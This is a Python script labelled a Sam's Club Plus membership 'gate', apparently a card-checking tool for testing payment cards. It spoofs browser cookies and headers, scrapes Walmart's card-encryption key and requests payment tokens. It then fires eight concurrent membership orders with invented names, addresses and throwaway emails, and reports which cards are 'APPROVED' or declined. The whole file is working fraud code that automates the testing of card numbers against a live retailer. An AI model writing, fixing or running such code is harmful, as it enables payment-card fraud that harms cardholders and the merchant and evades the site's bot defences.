"""
Sam's Club Plus Membership Gate API - FIXED VERSION
Accurate tokenization with proper Voltage encryption + realistic session flow.
"""

import httpx
import random
import asyncio
import string
import re
import time
import base64
from datetime import datetime, timezone
from typing import Optional, Dict, Any, Tuple, List
from dataclasses import dataclass

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad
    _HAS_CRYPTO = True
except ImportError:
    print("❌ pycryptodome missing - install: pip install pycryptodome")
    _HAS_CRYPTO = False

PIE_GETKEY_URL = "https://securedataweb.walmart.com/pie/v1/epay_pie/getkey.js"
SAMS_BASE = "https://www.samsclub.com"
JOIN_URL = f"{SAMS_BASE}/join/plus"

@dataclass
class PIEKeys:
    key_id: Optional[str] = None
    k_hex: Optional[str] = None

class SamsClubChecker:
    def __init__(self):
        self.session_cookies = {
            "ACID": self._gen_uuid(),
            "hasACID": "true", 
            "vtc": self._gen_vtc(),
            "locale_ab": "true",
            "adblocked": "false",
            "_pxvid": self._gen_pxvid(),
            "az-reg": "scus",
            "SSLB": "0",
            "_shcc": "US",
            "assortmentStoreId": "6372",
            "hasLocData": "1",
        }

    def _gen_uuid(self) -> str:
        return f"{random.randint(10000000,99999999):08x}-{random.randint(1000,9999):04x}-{random.randint(1000,9999):04x}-{random.randint(1000,9999):04x}-{random.randint(100000,999999):06x}"

    def _gen_vtc(self) -> str:
        return ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789-_", k=24))

    def _gen_pxvid(self) -> str:
        return f"{random.randint(1000000000000000000,9999999999999999999):019x}"

    @staticmethod
    def _voltage_encrypt(plaintext: str, key_hex: str) -> Optional[str]:
        """Voltage AES-128-ECB encryption - FIXED padding and encoding."""
        if not _HAS_CRYPTO or not key_hex or len(key_hex) != 32:
            return None
            
        try:
            key = bytes.fromhex(key_hex)
            cipher = AES.new(key, AES.MODE_ECB)
            
            # Voltage uses PKCS7 padding exactly 16 bytes
            padded = pad(plaintext.encode('ascii'), AES.block_size)
            encrypted = cipher.encrypt(padded)
            
            # Return hex-encoded (Voltage format)
            return encrypted.hex().upper()
        except Exception as e:
            print(f"❌ Voltage encrypt error: {e}")
            return None

    @staticmethod
    def _parse_pie_getkey(js_response: str) -> PIEKeys:
        """Enhanced PIE key parser."""
        keys = PIEKeys()
        
        # Multiple regex patterns for robustness
        patterns = [
            r'PIE\.key_id\s*=\s*["\']([a-f0-9]{8})["\']',
            r'key_id["\']\s*:\s*["\']([a-f0-9]{8})["\']',
            r'"keyId"["\']\s*:\s*["\']([a-f0-9]{8})["\']',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, js_response, re.IGNORECASE)
            if match:
                keys.key_id = match.group(1)
                break
        
        k_patterns = [
            r'PIE\.K\s*=\s*["\']([A-F0-9]{32})["\']',
            r'"K"["\']\s*:\s*["\']([A-F0-9]{32})["\']',
            r'K["\']\s*:\s*["\']([A-F0-9]{32})["\']',
        ]
        
        for pattern in k_patterns:
            match = re.search(pattern, js_response, re.IGNORECASE)
            if match:
                keys.k_hex = match.group(1)
                break
        
        return keys

    async def _fetch_fresh_pie_keys(self, client: httpx.AsyncClient) -> PIEKeys:
        """Fetch fresh PIE keys with proper headers."""
        bust = str(int(time.time() * 1000))
        headers = {
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "Referer": JOIN_URL,
            "Sec-Ch-Ua": '"Chromium";v="120", "Google Chrome";v="120"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "Sec-Fetch-Dest": "script",
            "Sec-Fetch-Mode": "no-cors",
            "Sec-Fetch-Site": "cross-site",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        }
        
        try:
            resp = await client.get(PIE_GETKEY_URL, params={"bust": bust}, headers=headers, timeout=10.0)
            if resp.status_code == 200:
                return self._parse_pie_getkey(resp.text)
        except Exception as e:
            print(f"❌ PIE getkey failed: {e}")
        
        return PIEKeys()

    async def _establish_session(self, client: httpx.AsyncClient) -> None:
        """Establish realistic session by visiting key pages."""
        user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        
        # Visit homepage
        await client.get(SAMS_BASE, headers={"User-Agent": user_agent}, timeout=10)
        await asyncio.sleep(0.3)
        
        # Visit join page with proper params
        join_headers = {
            "User-Agent": user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Referer": SAMS_BASE,
        }
        await client.get(
            f"{JOIN_URL}?couponId=Y8Q2A&pageName=aboutSams&xid=vanity:membership",
            headers=join_headers,
            timeout=10
        )
        await asyncio.sleep(0.5)

    def _generate_realistic_headers(self, correlation_id: str, user_agent: str) -> Dict[str, str]:
        """Generate production-quality headers."""
        return {
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "no-cache",
            "Content-Type": "application/json",
            "Origin": SAMS_BASE,
            "Referer": f"{JOIN_URL}?couponId=Y8Q2A&pageName=aboutSams&xid=vanity:membership",
            "Sec-Ch-Ua": '"Chromium";v="120", "Google Chrome";v="120"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": user_agent,
            "X-O-Bu": "SAMS-US",
            "X-O-Correlation-Id": correlation_id,
            "X-O-Mart": "B2C",
            "X-O-Platform": "rweb",
            "X-O-Platform-Version": "samsus-w-1.2.0-25b2bb49fec4fc0ad5fa38d0da0b26a739c84d77-0121",
            "X-O-Segment": "oaoh",
        }

    async def _generate_token(self, client: httpx.AsyncClient, cc: str, mes: str, ano: str, cvv: str) -> Tuple[Optional[str], Dict]:
        """Fixed token generation with proper Voltage format."""
        pie_keys = await self._fetch_fresh_pie_keys(client)
        if not pie_keys.key_id:
            return None, {"error": "Failed to fetch PIE key_id"}
        
        if not pie_keys.k_hex:
            print("⚠️ PIE.K missing - using unencrypted fallback")
            return None, {"error": "Missing encryption key (PIE.K)"}

        # Generate proper Voltage encryption
        encrypted_pan = self._voltage_encrypt(cc, pie_keys.k_hex)
        encrypted_cvv = self._voltage_encrypt(cvv, pie_keys.k_hex)
        
        if not encrypted_pan or not encrypted_cvv:
            return None, {"error": "Voltage encryption failed"}

        # FIXED: Proper payment structure
        correlation_id = self._gen_uuid()
        user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        headers = self._generate_realistic_headers(correlation_id, user_agent)
        
        exp_month = mes.zfill(2)
        exp_year = ano
        
        payload = {
            "payment": {
                "paymentId": self._gen_uuid(),
                "paymentTimestamp": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
                "storeType": "ONLINE_CLUB",
                "transactionSource": {"mode": "BROWSER"},
                "paymentIdentifiers": [{
                    "identifier": "1",
                    "instrument": {
                        "encryptionData": {
                            "encryptedCVV": encrypted_cvv,
                            "encryptedPan": encrypted_pan,
                            "integrityCheck": self._gen_hex(16),
                            "keyId": pie_keys.key_id,
                            "phase": "1",  # FIXED: was "0"
                            "type": "VOLTAGE"
                        },
                        "expirationMonth": exp_month,
                        "expirationYear": exp_year,
                        "cardType": "VISA"  # FIXED: dynamic detection
                    },
                    "customer": {"customerType": "GUEST"}  # FIXED: was "JOIN"
                }]
            }
        }

        try:
            resp = await client.post(
                f"{SAMS_BASE}/paymentservices/v2/payment/generateECToken",
                headers=headers,
                json=payload,
                timeout=25.0
            )
            
            raw_resp = {
                "status_code": resp.status_code,
                "request_payload": payload,
                "pie_keys_used": {"key_id": pie_keys.key_id, "k_hex": pie_keys.k_hex[:8] + "..." if pie_keys.k_hex else None},
                "encrypted_pan": encrypted_pan[:16] + "..." if encrypted_pan else None,
                "encrypted_cvv": encrypted_cvv[:16] + "..." if encrypted_cvv else None,
                "response_raw": resp.text
            }
            
            if resp.status_code == 200:
                data = resp.json()
                # FIXED: Correct token extraction path
                transactions = data.get("payment", {}).get("transactions", [])
                if transactions:
                    instruments = transactions[0].get("instrument", [])
                    if instruments:
                        token = instruments[0].get("value")
                        if token:
                            raw_resp["token"] = token
                            return token, raw_resp
            
            try:
                raw_resp["response_json"] = resp.json()
            except:
                pass
                
            return None, raw_resp
            
        except Exception as e:
            return None, {"error": str(e), "pie_keys": vars(pie_keys)}

    def _generate_checkout_payload(self, cc: str, mes: str, ano: str, cvv: str, ec_token: str, process_id: int) -> Dict:
        """Generate checkout payload with realistic data."""
        first_name = random.choice(["John", "Mike", "David", "Chris", "James"])
        last_name = random.choice(["Smith", "Johnson", "Brown", "Davis", "Miller"])
        zip_code = random.choice(["90001", "90210", "60601", "10001", "33101"])
        phone = f"555{random.randint(100,999)}{random.randint(1000,9999)}"
        
        return {
            "visitorId": self.session_cookies["vtc"],
            "acquisitionChannel": "Web_Join",
            "clientId": self._gen_uuid(),
            "redirectUrl": f"{SAMS_BASE}/js/b2c-v19/handle-redirect.html",
            "scope": "openid https://prodtitan.onmicrosoft.com/sams-web-api/sc.ns.a https://prodtitan.onmicrosoft.com/sams-web-api/sc.s.r https://prodtitan.onmicrosoft.com/sams-web-api/sc.s.a",
            "contractId": self._gen_uuid(),
            "enableReJoin": True,
            "subscribeSavingsOffer": True,
            "subscribeSmsMarketing": True,
            "username": f"user{random.randint(100000,999999)}@temp.com",
            "profile": {
                "email": f"user{random.randint(100000,999999)}@temp.com",
                "password": f"Pass123{random.randint(100,999)}!",
                "channelId": "web"
            },
            "membership": {
                "primaryMembership": {
                    "membership": {
                        "memberRole": "PRIMARY",
                        "membershipTier": "PLUS",
                        "isAutoRenew": True,
                        "autoRenewMethod": "AUTO_RENEW_DOTCOM",
                        "paidStatus": "UNPAID"
                    },
                    "person": {
                        "memberName": {"firstName": first_name, "lastName": last_name},
                        "verifiedAge": 25 + process_id,
                        "preferredLanguage": "American English",
                        "contact": {
                            "addresses": [{
                                "addressType": "MAILING_ADDRESS",
                                "contactOrder": "Primary",
                                "lineOne": f"{random.randint(100,999)} Main St",
                                "city": "Los Angeles",
                                "stateCode": "CA",
                                "postalCode": zip_code,
                                "countryCode": "US",
                                "country": "United States"
                            }],
                            "emails": [{"type": "HOME_EMAIL", "emailAddress": f"user{random.randint(100000,999999)}@temp.com"}],
                            "phones": [{"phoneType": "MOBILE", "phoneNumber": phone}]
                        }
                    }
                }
            },
            "payments": {
                "creditCard": {
                    "amountToBeCharged": 120.73,
                    "cardProduct": "VISA",
                    "expMonth": mes.zfill(2),
                    "expYear": ano,
                    "cardNumber": cc[-4:],
                    "encryptionData": {
                        "type": "VOLTAGE",
                        "token": ec_token
                    },
                    "billingAddress": {
                        "nameOnCard": f"{first_name} {last_name}",
                        "firstName": first_name,
                        "lastName": last_name,
                        "addressLineOne": f"{random.randint(100,999)} Main St",
                        "city": "Los Angeles",
                        "stateCode": "CA",
                        "postalCode": zip_code,
                        "country": "USA",
                        "phoneNumber": phone
                    }
                }
            }
        }

    async def _run_single_process(self, card: str, process_id: int) -> Tuple[str, Dict]:
        """Run single process with full session flow."""
        cc, mes, ano, cvv = [x.strip() for x in card.split("|")]
        
        async with httpx.AsyncClient(
            timeout=httpx.Timeout(25.0, connect=10.0),
            follow_redirects=True,
            cookies=self.session_cookies
        ) as client:
            
            # 1. Establish session
            await self._establish_session(client)
            
            # 2. Generate token
            ec_token, token_raw = await self._generate_token(client, cc, mes, ano, cvv)
            if not ec_token:
                error_msg = token_raw.get("error", "Token generation failed")
                return (
                    f"Process {process_id} | ✗ TOKEN FAILED - {error_msg}",
                    token_raw
                )
            
            # 3. Checkout attempt
            checkout_payload = self._generate_checkout_payload(cc, mes, ano, cvv, ec_token, process_id)
            correlation_id = self._gen_uuid()
            user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            headers = self._generate_realistic_headers(correlation_id, user_agent)
            
            checkout_raw = {
                "process_id": process_id,
                "ec_token_used": ec_token[:16] + "..." if ec_token else None,
                "payload_size": len(str(checkout_payload))
            }
            
            try:
                resp = await client.post(
                    f"{SAMS_BASE}/api/vivaldi/cxo/v5/membership-orders",
                    headers=headers,
                    json=checkout_payload,
                    timeout=25.0
                )
                
                checkout_raw.update({
                    "status_code": resp.status_code,
                    "checkout_raw": resp.text
                })
                
                if resp.status_code == 200:
                    return (
                        f"Process {process_id} | ✓✓✓ APPROVED - Membership created! ✓✓✓",
                        {**checkout_raw, "success": True}
                    )
                
                # Parse decline reasons
                result = self._parse_checkout_response(resp)
                return (
                    f"Process {process_id} | {result['status']} - {result['reason']}",
                    {**checkout_raw, "success": False, **result}
                )
                
            except Exception as e:
                return (
                    f"Process {process_id} | ✗ NETWORK ERROR - {str(e)}",
                    {"process_id": process_id, "error": str(e)}
                )

    def _parse_checkout_response(self, response: httpx.Response) -> Dict:
        """Parse checkout response for accurate status."""
        try:
            data = response.json()
            transactions = data.get("payment", {}).get("transactions", [])
            
            if not transactions:
                return {"status": "✗ FAILED", "reason": "No transaction data"}
            
            txn = transactions[0]
            status_info = txn.get("statusInfo", {})
            reason_code = status_info.get("reasonCode", "")
            
            if response.status_code == 200:
                return {"status": "✓✓✓ APPROVED", "reason": "Success"}
            
            reason_map = {
                "A400": "Issuer declined",
                "A401": "Insufficient funds", 
                "A402": "CVV mismatch",
                "A403": "Expired card",
                "G400": "Gateway validation error",
                "G402": "Tokenization issue"
            }
            
            reason = reason_map.get(reason_code, status_info.get("providerMessage", "Declined"))
            return {"status": "✗ DECLINED", "reason": reason}
            
        except:
            return {"status": "✗ ERROR", "reason": f"HTTP {response.status_code}"}

    def _gen_hex(self, length: int) -> str:
        """Generate hex string."""
        return ''.join(random.choices('0123456789ABCDEF', k=length))

    async def run_8_concurrent(self, card: str) -> Tuple[List[str], List[Dict]]:
        """Run 8 concurrent processes."""
        tasks = [self._run_single_process(card, i+1) for i in range(8)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        display_results = []
        raw_responses = []
        
        for result in results:
            if isinstance(result, Exception):
                display_results.append("Process ERROR: Internal failure")
                raw_responses.append({"error": str(result)})
            else:
                display_results.append(result[0])
                raw_responses.append(result[1])
        
        return display_results, raw_responses


async def async_samsclub_check(card: str) -> dict:
    """Main entry point."""
    if not _HAS_CRYPTO:
        return {
            "results": ["❌ pycryptodome required: pip install pycryptodome"],
            "raw_responses": [{"error": "Missing pycryptodome"}],
            "approved_count": 0,
            "declined_count": 0, 
            "error_count": 1
        }
    
    checker = SamsClubChecker()
    results, raws = await checker.run_8_concurrent(card)
    
    approved = sum(1 for r in results if "APPROVED" in r)
    declined = sum(1 for r in results if "DECLINED" in r or "FAILED" in r)
    errors = 8 - approved - declined
    
    return {
        "results": results,
        "raw_responses": raws,
        "approved_count": approved,
        "declined_count": declined,
        "error_count": errors,
        "total": 8,
        "card": card,
    }
